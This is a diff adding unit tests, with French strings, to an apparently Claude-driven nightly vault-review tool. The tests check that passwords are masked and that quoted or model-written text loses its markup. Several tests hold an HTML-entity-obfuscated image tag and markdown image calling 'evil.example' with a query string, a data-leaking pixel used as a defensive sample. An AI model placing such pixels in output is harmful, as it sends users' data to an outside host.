@@ -403,6 +403,17 @@ class Masking(unittest.TestCase):
         self.assertIsNone(judge.explanation("Voir https://exemple.invalid"))
         self.assertEqual(judge.explanation(ok), ok)
 
+    def test_short_passwords_after_a_keyword_do_not_leave(self):
+        for text, value in (("mdp: Kx7!q2", "Kx7!q2"), ("mot de passe : Zeta9!", "Zeta9!")):
+            self.assertNotIn(value, judge.mask_text("Accès wifi. " + text + " (box du salon)"), text)
+
+    def test_quotes_are_inert_in_the_vault(self):
+        for text in ('<img src="&#104;ttps&#58;&#47;&#47;evil&#46;example&#47;?q=neon">',
+                     "![](&#104;ttps&#58;//evil.example/x.png) `code` <%* tR += 1 %> [[lien]] <!-- x -->"):
+            out = rules.inline_quote(text, 240)
+            for bad in ("<", "&#", "![", "`", "[[", "<!--"):
+                self.assertNotIn(bad, out.replace("\\`", "").replace("!\\[", ""), text)
+
 
 # --------------------------------------------------------------------------- the child process
 
@@ -639,7 +650,7 @@ class DecisionContract(unittest.TestCase):
         note = rules.Note("Decisions/2026-03-01-base-neon.md", "/x", raw, 0)
         ctx = rules.Context(date(2026, 10, 14))
         t = rules.Target("k", {"new_rel": "Decisions/2026-09-10-base-docker.md", "new_quote": "", "old_quote": ""})
-        ch = rules.make_c2(note, [t], ctx, "C2-1014-01")
+        ch = rules.make_c2(note, [t], ctx, "C2-261014-01")
         after = ch.writes[note.rel]
         self.assertIn("status: superseded\nsuperseded_by: \"[[2026-09-10-base-docker]]\"\n---", after)
         self.assertEqual(rules.check_contract(ch, {note.rel: note.text}, {note.rel: after}), (True, ""))
@@ -824,6 +835,16 @@ class ReportOnlyNights(Night):
         report = read(self.vault, "Profile/controle.md")
         self.assertIn("[[agent]] dit « Règle : l'agent ne merge jamais. »", report)
         self.assertIn("Laquelle est vraie ?", report)
+
+    def test_nothing_claude_wrote_reaches_the_vault(self):
+        pixel = '<img src="&#104;ttps&#58;&#47;&#47;evil&#46;example&#47;?q=neon">'
+        answer = {"suspect": True, "constats": [dict(ANSWER["constats"][1], actuel="a", explication=pixel)],
+                  "lecons": []}
+        self.night(answer)
+        report = read(self.vault, "Profile/controle.md")
+        self.assertIn("[[agent]] dit « Règle : l'agent ne merge jamais. »", report)
+        for bad in ("<img", "&#104;", "Claude : « <"):
+            self.assertNotIn(bad, report)
 
     def test_suspect_answer_fixes_nothing_from_claude(self):
         base = self.head()
